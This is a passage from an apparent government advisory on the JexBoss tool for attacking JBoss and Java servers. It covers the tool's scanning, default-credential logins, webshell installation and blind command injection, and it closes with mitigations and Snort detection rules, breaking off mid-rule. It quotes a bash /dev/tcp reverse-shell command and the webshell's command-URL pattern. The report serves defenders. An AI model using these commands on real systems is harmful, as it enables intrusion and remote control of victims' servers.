protocol, host (Internet Protocol [IP] address or domain name), and port. In the example shown in figure 1, JexBoss will scan the target host at IP address 127[.]0[.]0[.]1 using HTTP and TCP port 8080.</p><p><strong>Note:</strong> for the remainder of this report, if two options behave identically, they will be shown with a slash (“/”) between them. For example, the <code>-host HOST </code>and <code>-u HOST </code>options will be shown as <code>-host/-u HOST</code>.</p><p style="text-align: center;"><a href="/sites/default/files/publications/figure1.png"><img alt="A screenshot of the JexBoss interface showing the target IP address on the command-line" src="/sites/default/files/publications/figure1.png" style="width: 731px; height: 31px;" /></a></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 1: JexBoss screenshot – specify target on the command-line</strong></p><p><strong>Note:</strong> all JexBoss screenshots in this report show JexBoss in standalone mode.</p><h6>Auto-Scan Mode</h6><p>The <code>-mode auto-scan</code> option instructs JexBoss to use auto-scan mode to identify and scan multiple hosts in a network block. This mode makes use of additional options:</p><ul><li><code>-network NETWORK</code>,</li><li><code>-ports PORTS</code>, and</li><li><code>-results LOGFILENAME</code>.</li></ul><p><code>NETWORK </code>must be a block of IP addresses in Classless Internet Domain Routing notation. If this option is omitted, JexBoss will scan the /16 network block of the attacking computer’s primary network interface. <code>PORTS </code>must be a comma-separated list of TCP ports. If this option is omitted, JexBoss will scan each IP address for TCP ports 80 and 8080, the standard HTTP ports.</p><p>JexBoss will scan the target block of IP addresses by attempting to connect to each IP address within the network block on each target TCP port. The results of the scan are written to the <code>LOGFILENAME</code> file, or <code>jexboss_auto_scan_results.log</code> if the -<code>results</code> option is omitted.</p><h6>File-Scan Mode</h6><p>The <code>-mode file-scan</code> option instructs JexBoss to use file-scan mode to scan multiple hosts specified in a file. This mode makes use of two additional options:</p><ul><li><code>-file FILENAME</code>, and</li><li><code>-out LOGFILENAME</code>.</li></ul><p>The <code>-file</code> option is required for file-scan mode. The contents of the <code>FILENAME</code> file must be a list of targets, one per line, in the same format as required by the <code>-host/-u HOST</code> option. JexBoss will attempt to scan each target specified in the <code>FILENAME </code>file. The results of the scan are written to the <code>LOGFILENAME</code> file, or to <code>jexboss_file_scan_results.log</code> if the <code>-out</code> option is omitted.</p><h5>JexBoss Vulnerability Scan</h5><p>JexBoss scans targets to test whether they are vulnerable to several known exploits (e.g., weak authentication, Java object deserialization flaws). JexBoss then displays a report with the test results, indicating whether the tested components are exposed, vulnerable, or secured (the indicator for a secured component is “OK”).</p><p><br />The results shown in figure 2 indicate that the JBoss admin-console is exposed (i.e., reachable by the attacker) and that the JBoss AS jmx-console and JMXInvokerServlet components are vulnerable to exploitation. The results identify the other applications and frameworks as safe from the JexBoss exploits.</p><p style="text-align: center;"><img alt="A JexBoss screenshot showing the results of the tool testing for vulnerabilities in a target host" src="/sites/default/files/publications/jexboss-figure2.png" style="width: 729px; height: 425px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 2: JexBoss screenshot – vulnerability test results</strong></p><p><strong>Note:</strong> in a properly managed JBoss AS deployment, the admin-console should not be reachable from the internet; it should only be reachable from trusted internal hosts. However, even if an admin-console is only reachable from trusted internal hosts, dedicated attackers may be able to gain access to those internal hosts and attack the JBoss AS deployment from there.</p><h5>JexBoss Exploitation</h5><p>After scanning, JexBoss may perform exploitation of identified vulnerabilities depending upon the mode and options chosen.</p><p>When run in standalone mode, JexBoss will display the results of the scan as shown in figure 2 by default. JexBoss will then enter an interactive mode that asks the attacker for input. As shown in figure 3, JexBoss will ask the attacker whether it should try to run an automated exploitation of a specific vulnerability.</p><p style="text-align: center;"><img alt="A screenshot from JexBoss that shows the tool asking if the user would like to continue" src="/sites/default/files/publications/jexboss-figure3.png" style="width: 725px; height: 112px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 3: JexBoss screenshot – JexBoss asks permission to continue</strong></p><p>If the attacker answers <code>yes</code>, JexBoss will attempt to exploit the vulnerability in admin-console.</p><p>Figure 4 illustrates JexBoss targeting the admin-console component to determine if the JBoss AS platform is configured with the default administrator username and password—which would be the case for an improperly managed JBoss AS deployment. In the exploit attempt shown in figure 4, JexBoss is attempting to log in to JBoss AS with default credentials. Alternatively, the attacker can specify the credentials JexBoss should attempt to use for the login, by using the <code>-J/--jboss-login</code> options.</p><p style="text-align: center;"><img alt="A screenshot of the JexBoss tool showing the tool's interactive exploitation of the target admin-console" src="/sites/default/files/publications/Jexboss-figure4.png" style="width: 733px; height: 704px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 4: JexBoss screenshot – interactive exploitation of the admin-console</strong></p><p>Figure 4 indicates success for several phases of the exploit attempt. These phases are listed below.</p><ul><li><strong>Delivery:</strong> JexBoss attempted login with default credentials; this attempt was sent to the JBoss AS admin-console.<ul><li>The success of this attempt is indicated by the phrase: “Trying to perform authentication with default credentials”.</li></ul></li><li><strong>Exploitation: </strong>JexBoss successfully logged in with default credentials.<ul><li>The success of this attempt is indicated by the phrase: “Successfully logged in!”</li></ul></li><li><strong>Installation:</strong> JexBoss successfully deployed the webshell code.<ul><li>The success of this attempt is indicated by the phrase: “Successfully deployed code!”</li></ul></li><li><strong>Command and Control (C2):</strong> JexBoss successfully executed OS commands.<ul><li>The success of this attempt is indicated by the output of the <code>uname -a</code> command, which starts with “Linux 2f8c3354a075 4.13.0-38”.</li></ul></li><li><strong>Action on Objectives:</strong> JexBoss successfully attempted this phase, as evident by the presence of the Shell&gt; prompt.<ul><li>The success of this attempt is indicated by the presence of the <code>Shell&gt;</code> prompt. The attacker can use the interactive <code>Shell&gt;</code> prompt to access the JexBoss webshell to execute OS commands and see the command output.</li></ul></li></ul><h6>Automated Exploitation</h6><p>The auto-scan and file-scan modes of JexBoss will, by default, only perform the vulnerability scan and report the results. To exploit vulnerabilities when using these modes, the attacker must specify the <code>-A/--auto-exploit</code> option. The <code>-A/--auto-exploit </code>option can also be used in standalone mode, which will remove the yes or no questions asking whether to run automated exploitation, as well as the access to the webshell via the <code>Shell&gt;</code> prompt.</p><h6>Webshell Installation</h6><p>JexBoss can use a number of different exploits to attempt to install the JexBoss webshell (e.g., exploitation of the JMX console). Once installed, the webshell grants the attacker the ability to execute OS commands remotely by accessing the webshell URL over HTTP or HTTP Secure (HTTPS). The webshell also enables the attacker to receive the command output in response. See the Webshell Analysis section for a description of the JexBoss webshell’s capabilities.</p><p><br />JexBoss will attempt to exploit the vulnerable component to upload the webshell code over the HTTP session and install the webshell into the web server. If this is not successful—and depending upon the vulnerability—JexBoss may attempt to exploit the vulnerability to induce the web server to download and install the webshell from the internet.<br />When used in standalone mode, JexBoss allows the attacker to use the webshell through the interactive <code>Shell&gt;</code> prompt by default, as shown in figure 4.</p><h6>Blind Command Injection</h6><p>In cases where the installation of the webshell fails or is not possible, such as with application Java deserialization vulnerabilities, JexBoss will attempt to perform a blind command injection. A blind command injection sends a payload—created by the attacker, and which includes an OS command—to the vulnerable component. The vulnerable component processes the payload insecurely and executes the embedded OS command. After the embedded OS command is executed, the output of this execution is not returned to the attacker; therefore, the command injection occurs “blindly.” The attacker can only determine whether the command was executed successfully by observing the effects of the command execution.</p><p>JexBoss automates the creation and delivery of the payload. When attempting a blind command injection, the default OS command JexBoss packages in the payload is a Linux-specific command to create a reverse shell (see the Reverse Shell section).</p><p>Alternatively, the attacker can specify a different OS command to be executed using the <code>--cmd CMD</code> option. As shown in figure 5, the <code>CMD </code>value is the alternate OS command.</p><p><strong>Note:</strong> using the <code>--cmd</code> option in the auto-scan and file-scan modes requires using the <code>-A/--auto-exploit</code> option, otherwise the<code> --cmd</code> option will be ignored.</p><p style="text-align: center;"><img alt="A screenshot of the JexBoss tool specifying the injection of an operating system command with the &quot;--cmd&quot; option" src="/sites/default/files/publications/jexboss-figure5.png" style="width: 731px; height: 42px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 5: Specifying injected OS command with the <code>--cmd</code> option</strong></p><p>In addition to the exploits against the vulnerable Java-based applications and frameworks shown in figure 2, JexBoss also supports the exploitation of arbitrary Java deserialization vulnerabilities with blind command injection attacks. To accomplish this, the attacker supplies a URL with the <code>-host/-u</code> option, an application parameter into which the payload will be injected with the <code>-H/--post-parameter PARAMETER</code> option, and the <code>-j/--app-unserialize</code> option.</p><h6>Reverse Shell</h6><p>A reverse shell is a common technique attackers use to execute commands interactively—with keyboard input and text output—through the target system’s built-in command-line programs. JexBoss relays the input and output of the command-line program—usually through the Bash command language interpreter on Linux targets and cmd.exe on Windows targets—through a TCP connection initiated by the target to an IP address and a port of the attacker’s choosing.</p><p>The JexBoss webshell includes the capability to establish a reverse shell. If the attacker issues the <code>jexremote=IP:PORT</code> command to the webshell, the webshell will initiate a connection to the specified IP address and TCP port using Java’s Socket class and relay OS commands to and output from the command-line program through that connection. An example of the <code>jexremote</code> command is shown in figure 4.</p><p>Establishing a reverse shell can also be performed using blind command injection. The default OS command JexBoss packages in the exploit payload to create a reverse shell is</p><p style="text-align: center;"><code>/bin/bash –i &gt; /dev/tcp/IP/PORT 0&amp;&gt;1 2&gt;&amp;1</code></p><p>(where <code>IP </code>and <code>PORT </code>are specified by the attacker). This command redirects the standard input and output of the Bash shell through the victim Linux kernel’s built-in TCP device. For blind command injection, JexBoss obtains the <code>IP </code>and <code>PORT </code>values either from the values supplied in the <code>-r/--reverse-host RHOST:RPORT</code> option, or by prompting the attacker for those values, as shown in figure 6.</p><p style="text-align: center;"><img alt="A screenshot of JexBoss obtaining the IP and PORT for the reverse shell" src="/sites/default/files/publications/jexboss-figure6.png" style="width: 730px; height: 239px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 6: JexBoss screenshot – JexBoss obtaining the <code>IP</code> and <code>PORT</code> for the reverse shell</strong></p><p>To establish the TCP connection for the reverse shell, the computer with the IP address specified by the attacker must listen for connections on the specified TCP port. The program that listens for these connections must be able to accept user command-line input and display text output.</p><p>A common tool used to listen for reverse shell connections is Netcat. Figure 7 shows Netcat being used to listen for incoming connections on TCP port 4444. After the reverse shell is established, Netcat shows the shell prompt. The attacker then uses the reverse shell to display the <code>/etc/passwd</code> file to get a listing of user accounts on the target.</p><p style="text-align: center;"><img alt="A screenshot of JexBoss that shows the reverse shell using an Netcat listener" src="/sites/default/files/publications/jexboss-figure7.png" style="width: 736px; height: 152px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 7: JexBoss screenshot - reverse shell using a Netcat listener</strong></p><p>Attackers often use tools that are more sophisticated than Netcat, such as Meterpreter, to listen for reverse shell connections and control the reverse shell.</p><h4>Observable Network Behavior</h4><p>Security analysts can observe JexBoss’ behavior through passive network traffic monitoring. The observable content depends upon the location of the organization’s network traffic monitoring sensor. Communication between the attacker and the target can be observed at any in-line point—on either the attacker’s local network or the target’s local network. Figure 8 shows an organization’s typical network sensor architecture, including a passive sensor monitoring the packets traversing the organization’s primary ingress and egress points.</p><p style="text-align: center;"><img alt="Illustration that shows an organization's typical network sensor location between the organization's network and the internet service provider" src="/sites/default/files/publications/jexboss-figure8.PNG" style="width: 1200px; height: 578px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 8: Typical organization's network sensor location</strong></p><h5>Version Checks</h5><p>Upon its initial execution in any of the scan modes, JexBoss will attempt to retrieve its version information from the internet by reaching out to the following URL:</p><p style="text-align: center;"><code>hxxp[:]//joaomatosf.com/rnp/releases.txt</code></p><p><strong>Note:</strong> all URLs have been modified to prevent unintentional access.</p><p>If the version of JexBoss being used is not the latest version, the attacker will see a message recommending an upgrade.</p><p>Some versions of the JexBoss webshell include a version check function, which can determine if the webshell being used is the latest version. The target computer will retrieve the latest available webshell version number from the following URL:</p><p style="text-align: center;"><code>hxxp[:]//webshell.jexboss.net/jsp_version.txt</code>.</p><p>If the installed webshell is not the latest available version, the attacker will see an HTTP response that includes a message recommending the webshell be upgraded, once the attacker accesses the webshell.</p><p><strong>Note:</strong> both of the JexBoss version checks detailed above will be evident to an affected organization. The organization will be able to see a lookup of the <code>joaomatosf.com</code> or <code>webshell.jexboss.net</code> domains in their Domain Name System (DNS) queries. These URLs will also be present in the organization’s HTTP traffic. When these artifacts are found on an organization’s network, they indicate JexBoss is present, which is a potential security risk and should be investigated.</p><p>The attacker using JexBoss can disable both version checks by using the <code>-D/--disable-check-updates</code> option.</p><h5>Webshell Download</h5><p>If the installation of the JexBoss webshell fails, JexBoss may attempt to induce the target server to download and install the JexBoss webshell from the internet at the following URL:</p><p style="text-align: center;"><code>hxxp[:]//www.joaomatosf.com/rnp/jexws4.war</code></p><p>If the <code>hxxp[:]//www.joaomatosf.com/rnp/jexws4.war </code>domain or URL is present in an organization’s DNS and HTTP logs, this indicates the JexBoss webshell may be present on the organization’s network. Any organization that identifies this activity should investigate it.</p><p>Note: the filename of the webshell downloaded may change. The public webshell files on <code>hxxp[:]//www.joaomatosf.com</code> reveal multiple <code>jexws*.war </code>files, all of which have basically the same content, but with different MD5 checksums. Using different MD5 checksums allows older versions of JexBoss to induce the web server to download the latest version of the webshell.</p><h5>Attack Communication Parameters</h5><p>Communications between the attacker and target occur over HTTP or HTTPS, depending upon the target’s web server configuration. HTTPS communications—typically over TCP port 443 or 8443—are encrypted. Organizations that use reverse proxies or some configurations of web application firewalls may be able to observe decrypted network traffic between the perimeter device and the web server. Otherwise, the signs of an attack over HTTPS will only be observable in network appliance logs or on the web server itself.</p><p><strong>Note:</strong> for the remainder of this report, unless otherwise noted, network traffic is assumed to be unencrypted HTTP, typically over port 80 or 8080.</p><p>When JexBoss starts, it randomly selects one User-Agent header value from the list in table 1 to use for all HTTP requests to the target web server. The User-Agent values listed in table 1 are legitimate, helping JexBoss traffic blend in with legitimate HTTP traffic. However, they are also dated, which may help organizations differentiate them from normal HTTP traffic.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 882px; height: 587px;"><caption><p><strong>Table 1: JexBoss User-Agent header value choices</strong></p></caption><thead><tr><th scope="col"><strong>HTTP User-Agent Header Value Choices</strong></th></tr></thead><tbody><tr><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0</td></tr><tr><td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0</td></tr><tr><td>Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36</td></tr><tr><td>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9</td></tr><tr><td>Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36</td></tr><tr><td>Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0</td></tr><tr><td>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)</td></tr><tr><td>Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)</td></tr><tr><td>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)</td></tr><tr><td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0</td></tr><tr><td>Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36</td></tr><tr><td>Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12.388 Version/12.17</td></tr><tr><td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0</td></tr><tr><td>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0</td></tr></tbody></table><p>Because JexBoss is written in Python, it is easy for sophisticated attackers to alter some of the static data sent to the target web server—including the User-Agent header value choices and parts of the exploits themselves—which would make signature-based detection ineffective.</p><h5>Attack Phases</h5><p>NCCIC has assessed that JexBoss operates at all seven steps in the Cyber Kill Chain framework. Due to the nature of the vulnerabilities and how they are exploited, JexBoss combines some of the steps, resulting in three high-level phases:</p><ul><li>Phase 1: Reconnaissance;</li><li>Phase 2: Weaponization, Delivery, Exploitation, and Installation; and</li><li>Phase 3: C2 and Action on Objectives.</li></ul><h6>Phase 1: Reconnaissance</h6><p>In Phase 1, JexBoss determines which componentsof the target web server, if any, are exposed and vulnerable. JexBoss connects to the target web server multiple times and makes multiple HTTP requests—using the <code>GET </code>and <code>HEAD </code>methods—to gather this information (see figure 9).</p><p style="text-align: center;"><img alt="A scrennshot showing a typical UNiform Resource Identifier (URI) probe" src="/sites/default/files/publications/jexboss-figure9.png" style="width: 837px; height: 157px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 9 : Typical Uniform Resource Identifier (URI) probe</strong></p><p>Aside from the references to JexBoss in some URLs, most of these requests look legitimate or benign, with one notable exception, shown in figure 10.</p><p style="text-align: center;"><img alt="A screenshot showing code from the JexBoss-specific Apache Struts 2 probe" src="/sites/default/files/publications/jexboss-figure10.png" style="width: 789px; height: 244px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 10: JexBoss-specific Apache Struts 2 probe</strong></p><p>The HTTP request shown in figure 10 almost exactly matches the exploit of the Apache Struts 2 vulnerability (CVE-2017-5638) published by Vex Woo in March 2017.<a href="https://www.exploit-db.com/exploits/41570/">[3]</a> However, JexBoss customizes two parts of this snippet by using <code>#gift</code> and <code>#giftarray</code>—instead of<code> #cmd</code> and <code>#cmds</code>—and by using <code>jexboss </code>as the command, which uniquely identifies the activity as being related to JexBoss.</p><p><strong>Note:</strong> the HTTP request shown in figure 10 attempts to exploit the Apache Struts 2 vulnerability; however, there is no command execution in this phase—JexBoss is only trying to determine if an exploit is possible.</p><p>Network defenders can deploy intrusion detection system (IDS) signatures—such as those found in the Network IDS and IPS Signatures section—to detect JexBoss’ initial reconnaissance activity. However, some of these signatures will fire on attempted exploits, not just successful exploits, which limits their value to the defender.</p><h6>Phase 2: Weaponization, Delivery, Exploitation, and Installation</h6><p>JexBoss weaponizes exploits in different ways, depending upon the vulnerability being exploited. For example, to exploit the Apache Struts 2 vulnerability (CVE-2017-5638), JexBoss packages the exploit and the OS command to run in the Content-Type HTTP header value that will be delivered to the target web server in a <code>HTTP GET</code> request (see figure 10).</p><p>JexBoss delivers exploits to the target web server over HTTP using <code>GET </code>or <code>POST </code>requests for URIs and data specific to the vulnerabilities.</p><p>The exploits JexBoss uses are vulnerability-specific. For example, the attack against the admin-console exploits weak configurations of JBoss AS by simply attempting to log in with a username and password. Other attacks attempt to exploit Java deserialization vulnerabilities to install the JexBoss webshell or to execute OS commands.</p><p>Figure 11 shows an example of the weaponization of the JexBoss webshell delivered as a URI query parameter in an HTTP HEAD request, exploiting a vulnerability in the JMX Console (a component of JBoss AS). If this exploit is successful, the victim web server will install the JexBoss webshell.</p><p style="text-align: center;"><img alt="A screenshot showing an example of a JexBoss webshell in a URI query parameter" src="/sites/default/files/publications/jexboss-figure11.png" style="width: 809px; height: 229px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 11: Example of JexBoss webshell in URI query parameter</strong></p><p>The packet dump shown in figure 12 is an example of the JexBoss webshell weaponized as a Java serialized object delivered to the JMX Invoker Servlet—another component of JBoss AS—in an <code>HTTP POST</code> request. The serialized object in this example (figure 11) begins with the bytes <code>\xAC\xED</code> at byte position <code>0x01c4</code>—452 bytes into the HTTP request.</p><p style="text-align: center;"><img alt="A screenshot that shows an example of a JexBoss webshell packaged in a Java serialized object" src="/sites/default/files/publications/jexboss-figure12.png" style="width: 539px; height: 579px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 12: Example of JexBoss webshell packaged in a Java serialized object</strong></p><p>To test whether the installation of the webshell has succeeded, JexBoss will submit an <code>HTTP GET</code> request to the target web server for one of the following URLs:</p><ul><li><code>hxxp[:]//victim/jexws4/jexws4.jsp</code>, or</li><li><code>hxxp[:]//victim/jexinv4/jexinv4.jsp</code>.</li></ul><p>Packet number 22 in figure 13 indicates the test for successful webshell installation. Packet number 24, the HTTP response to packet number 22, is an <code>HTTP 200 OK</code> message that indicates the webshell installation was successful. An <code>HTTP 404 Not Found</code> message in response indicates that the webshell installation failed.</p><p style="text-align: center;"><img alt="A screenshot showing the the JexBoss webshell access packet list" src="/sites/default/files/publications/jexboss-figure13.png" style="width: 1038px; height: 134px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 13: JexBoss webshell access packet list</strong></p><h6>Phase 3: C2 and Actions on Objectives</h6><p>If JexBoss succeeds in installing the JexBoss webshell on the victim web server, the webshell will allow the attacker to issue OS commands for execution through <code>HTTP GET</code> requests as follows:</p><p style="text-align: center;"><code>hxxp[:]//victim/jexws4/jexws4.jsp?ppp=&lt;url-encoded-OS-command&gt;</code></p><p>For example, the packet contents displayed in figure 14 show that the attacker issued the id OS command to the webshell. In figure 14, the victim web server provided the OS command execution output in the HTTP response.</p><p style="text-align: center;"><img alt="A screenshot of the HTTP contents of the JexBoss webshell command" src="/sites/default/files/publications/jexboss-figure14.png" style="width: 826px; height: 264px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 14: JexBoss webshell command HTTP contents</strong></p><p>When JexBoss is run in standalone mode, JexBoss will issue three specific commands—after the successful installation of the webshell—sequentially upon initial exploitation of a Linux server. These commands are listed in table 2.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 801px; height: 312px;"><caption><p><strong>Table 2: JexBoss' default initial Linux commands</strong></p></caption><thead><tr><th scope="col"><strong>Command</strong></th><th scope="col"><strong>Description of Action</strong></th></tr><tr><td scope="col" style="text-align: left;">uname -a</td><td scope="col" style="text-align: left;">Retrieves host information</td></tr><tr><td scope="col" style="text-align: left;">cat /etc/issue</td><td scope="col" style="text-align: left;">Retrieves Linux OS information</td></tr><tr><td scope="col" style="text-align: left;">id</td><td scope="col" style="text-align: left;">Determines the user under which commands will run</td></tr></thead></table><p>Security analysts can observe the attempted execution of these three commands in web server logs, even if the HTTP communication is encrypted with Transport Layer Security or Secure Sockets Layer. Analyzing web server logs for this activity is an additional way organizations can confirm the presence of JexBoss.</p><p>For vulnerabilities exploited through blind command injection, there is no installation step. JexBoss achieves the Cyber Kill Chain steps C2 and Actions on Objectives (i.e., Phase 3 in the Attack Phases section) by packaging OS commands directly in the exploit payload and delivering the payload to the vulnerable component; therefore, there is no distinction between Phase 2 and Phase 3 in blind command injection.</p><p>The partial packet hexdump shown in figure 15 is an example of the C2 step with blind command injection. In this example, JexBoss packages and delivers an OS command that attempts to establish a reverse shell, described in the Reverse Shell section.</p><p style="text-align: center;"><img alt="A screenshot of a JexBoss packet hexdump that includes a reverse shell OS command" src="/sites/default/files/publications/jexboss-figure15.png" style="width: 539px; height: 186px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 15: KexBoss packet hexdump including reverse shell OS command</strong></p><p>While a reverse webshell can help attackers achieve C2, it is also easy to detect. An organization’s network web servers do not typically make outbound connections to arbitrary internet hosts; therefore, connections like these would be a red flag for network defenders. In the network capture shown in figure 16, the victim server has established a connection back to the attacker’s system via TCP port 4444.</p><p style="text-align: center;"><img alt="A screenshot showing the JexBoss reverse webshell establishment packet list" src="/sites/default/files/publications/jexboss-figure16.png" style="width: 821px; height: 173px;" /></p><p style="text-align: center; color: rgb(170, 170, 170); font-style: italic;"><strong>Figure 16: JexBoss reverse webshell establishment packet list</strong></p><p>An unusual outbound connection—like the one illustrated in figure 16—would stand out to an experienced network defender; the network defender’s awareness of the anomalous behavior increases the attacker’s risk of detection. Many organizations choose to filter outbound connections, which would stop an attempt like the one illustrated in figure 16.</p><p>Attackers can execute JexBoss commands without a webshell or reverse webshell by using the<code> --cmd </code>option, as described in the Blind Command Injection section. A clever attacker could issue commands to perform complex tasks and exfiltrate data. For example, the attacker may create a script that collects data and sends it to another location on the victim network for later retrieval.</p><h5>Webshell Analysis</h5><p>If the JexBoss webshell is installed on the victim web server, JexBoss can access the webshell by issuing <code>HTTP GET</code> requests to the appropriate <code>.jsp </code>file (e.g., <code>jexws4/jexws4.jsp</code>), using the optional <code>ppp </code>query parameter, the value of which is used as the OS command to execute on the victim web server.</p><p><br />There are three main versions of the JexBoss webshell: the original version (November 30, 2014), version 2 (April 23, 2016), and version 4 (the current version). Each time a subsequent JexBoss version is created, the new version can be considered an upgrade over the previous version and offering additional capabilities, as described in table 3.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 939px; height: 376px;"><caption><p><strong>Table 3: JexBoss webshell functionality by version</strong></p></caption><thead><tr><th scope="col"><strong>Webshell Version</strong></th><th scope="col"><strong>Functionality</strong></th></tr><tr><td scope="col" style="text-align: left;">Original (November 30, 2014)</td><td scope="col" style="text-align: left;"><ul><li>Executes OS commands specified in the <code>ppp </code>HTTP query parameter using Java’s <code>Runtime.exec() </code>method and returns the output of the command execution in the HTTP response</li><li>Requires the <code>User-Agent: jexboss</code> HTTP header</li></ul></td></tr><tr><td scope="col" style="text-align: left;">Version 2 (April 23, 2016)</td><td scope="col" style="text-align: left;"><ul><li>Checks the webshell version if the check-updates HTTP header value is not set to false (see the Version Checks section)</li><li>Does not require the <code>User-Agent: jexboss</code> HTTP header</li><li>Executes OS command using Java’s <code>Runtime.exec()</code> method<ul><li>Uses <code>cmd.exe /C </code>for Windows OSs</li><li>Uses <code>/bin/bash -c</code> for non-Windows OSs</li></ul></li></ul></td></tr><tr><td scope="col" style="text-align: left;">Version 4 (Current)</td><td scope="col" style="text-align: left;"><ul><li>If the ppp HTTP query parameter is not specified, checks for the <code>X-JEX</code> HTTP header and, if present, uses the value of that header as the OS command</li><li>If the OS command is in the format<code> jexremote=IP:PORT</code>, establishes a reverse shell (using <code>cmd.exe</code> or <code>/bin/bash</code>, depending upon the web server OS) with the specified IP address and port using Java’s Socket class</li></ul></td></tr></thead></table><p>JexBoss webshell version 2 is the latest version available on GitHub, as described in the Version Checks section. This version check uses a User-Agent HTTP header value that includes information about the attacker’s webshell access: the host HTTP header value and the IP address of the attacker host. This collection of host and IP information indicates that JexBoss’ author may leverage attackers’ use of the tool to collect a list of attacking IPs and exploited servers.</p><p>The latest version of the webshell available on <code>joaomatosf[.]com</code> is version 4. At the time of this report’s publication, NCCIC has been unable to acquire version 3 for analysis.</p></div>
+      
+
+        
+        
+        
+        
+        
+        		    <a id="solution"></a>
+		    <h3>Solution</h3>
+            
+            <div class="field field--name-field-ar-solution field--type-text-long field--label-hidden field--item"><p>NCCIC recommends a defense-in-depth approach to mitigating the risks of JexBoss.</p><h4>Best Practices</h4><p>The best way to defend against JexBoss is to ensure that servers are not vulnerable to the exploits it uses. The vulnerabilities exploited by JexBoss can also be exploited by other tools. Once an organization has remediated the vulnerabilities associated with JexBoss, the organization’s servers will be less prone to other tools that leverage the same exploits.</p><p>Best practices include</p><ul><li>Keeping OSs, web servers, and applications up-to-date;</li><li>Securing access to administrative consoles;</li><li>Using non-privileged accounts with limited capabilities to run servers;</li><li>Reviewing server logs to identify indications of a successful compromise; and</li><li>Frequently testing organization systems and applications for the latest vulnerabilities via automated vulnerability scans.</li></ul><p>Because JBoss AS is no longer supported by the vendor, organizations using JBoss AS should migrate their existing JBoss AS instances to the supported equivalent, such as WildFly or the JBoss Enterprise Application Platform. Because JexBoss can be used to exploit a variety of other Java-based frameworks (e.g., Apache Struts, Java Server Faces, Jenkins), users should keep these frameworks updated, or remove them if they are not necessary.</p><h4>Detection Strategies</h4><p>An organization’s security operations team can monitor for attempted and successful JexBoss exploit attacks using a variety of methods. NCCIC recommends the following detection strategies:</p><ul><li>Update network IDS and IPS signatures.</li><li>Analyze behavioral indicators.</li><li>Analyze on-server artifacts.</li></ul><h5>Network IDS and IPS Signatures</h5><p>Many organizations deploy Snort or Suricata IDSs in commercial appliances—or as standalone platforms on commodity hardware—and leverage signatures written by Snort, Emerging Threats, and others in the cybersecurity community. Tables 4 and 5 provide signatures developed by NCCIC and other organizations. Signatures that were created by outside organizations reference the appropriate signature identifier.</p><p>NCCIC assesses the Snort rules in table 4 to be high-confidence indicators of potentially dangerous JexBoss webshell network behavior.</p><table border="1" cellpadding="1" cellspacing="1" class="general-table" style="width: 902px; height: 312px;"><caption><p><strong>Table 4: JexBoss webshell Snort signatures/rules</strong></p></caption><thead><tr><th scope="col">#</th><th scope="col"><strong>JexBoss Behavior</strong></th><th scope="col"><strong>Detection Signature/Rule</strong></th></tr><tr><td scope="col" style="text-align: left;">1</td><td scope="col" style="text-align: left;">Attempts to issue a command to the JexBoss webshell with the <code>ppp </code>query parameter</td><td scope="col" style="text-align: left;">alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:"JexBoss webshell command ppp submission"; flow:established,to_server; content:".jsp?ppp="; http_uri; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; sid:X; rev:1;)</td></tr><tr><td scope="col" style="text-align: left;">2</td><td scope="col" style="text-align: left;">Attempts to issue a command to the JexBoss webshell with the <code>X-JEX</code> HTTP header field</td><td scope="col" style="text-align: left;">alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS any (msg:"JexBoss webshell command X-JEX submission"; flow:established,to_server; content:"X-JEX"; http_header; fast_pattern:only; classtype:trojan-activity; reference:url,github.com/joaomatosf/jexboss; 